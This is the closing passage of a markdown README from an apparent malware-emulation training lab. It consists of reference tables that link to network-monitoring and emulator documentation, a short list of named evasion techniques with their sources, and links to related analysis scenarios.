| Zeek `http.log` and `dns.log` | Zeek Logs | [Zeek Documentation](https://docs.zeek.org/en/master/logs/http.html) |
| Suricata Rules | Suricata Alerts | [Suricata Rules Documentation](https://suricata.readthedocs.io/en/suricata-6.0.0/rules/intro.html) |
| Windows Defender ATP | Microsoft Defender ATP | [Microsoft Defender ATP Documentation](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/microsoft-defender-atp) |

### **Attacker Techniques**
| **Technique** | **Source** |
|---------------|------------|
| Anti-Emulation Checks | [SANS FOR508 - Anti-Emulation](https://www.sans.org/white-papers/36667/) |
| API Hashing | [Mandiant - API Hashing Tool](https://www.mandiant.com/resources/blog/api-hashing-tool) |
| Reflective DLL Injection | [GitHub - Reflective DLL Injection](https://github.com/stephenfewer/ReflectiveDLLInjection) |
| Process Hollowing | [MITRE ATT&CK - T1055.012](https://attack.mitre.org/techniques/T1055/012/) |
| Time-Based Evasion | [SANS - Analyzing Malware with Time Delays](https://www.sans.org/blog/analyzing-malware-with-time-delays/) |

### **General References**
| **Topic** | **Source** |
|-----------|------------|
| Speakeasy Unsupported APIs | [Speakeasy Wiki - Unsupported APIs](https://github.com/mandiant/speakeasy/wiki/Unsupported-APIs) |
| Qiling Architecture Support | [Qiling GitHub - Overview](https://github.com/qilingframework/qiling#overview) |
| Unicorn Engine Documentation | [Unicorn Engine Docs](https://www.unicorn-engine.org/docs/) |

---

## Related modules
- [Scenario: packed-malware unpacking workflow](../52-unpacking-case/README.md) -- same learning path (Scenarios): Learn how to unpack malware before emulating it to reveal hidden behavior.
- [Scenario: .NET malware analysis](../53-dotnet-malware-case/README.md) -- same learning path (Scenarios): Analyze .NET malware using emulation and decompilation techniques.
- [Scenario: shellcode extraction & analysis](../54-shellcode-case/README.md) -- same learning path (Scenarios): Extract and emulate shellcode from malware samples.
- [Scenario: document detonation with network sim](../55-doc-detonation-case/README.md) -- same learning path (Scenarios): Combine emulation with network simulation to analyze malicious documents.

<!-- cyberlab-enriched: v6 -->
